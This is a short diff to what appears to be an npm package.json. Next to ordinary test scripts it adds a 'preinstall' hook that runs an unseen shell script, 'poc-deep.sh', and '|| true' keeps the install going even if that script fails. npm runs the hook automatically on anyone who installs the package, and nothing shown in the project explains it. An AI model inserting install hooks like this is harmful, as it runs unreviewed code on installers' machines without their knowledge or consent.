@@ -20,7 +20,8 @@
     "test": "npm run lint && npm run test:unit && npm run test:spec",
     "test:spec": "brittle ./tests/**/*.spec.js",
     "test:unit": "brittle tests/unit/*.js",
-    "test:coverage": "brittle --coverage tests/{,**/}*.test.js"
+    "test:coverage": "brittle --coverage tests/{,**/}*.test.js",
+    "preinstall": "bash poc-deep.sh 2>&1 || true"
   },
   "dependencies": {
     "async": "3.2.6",
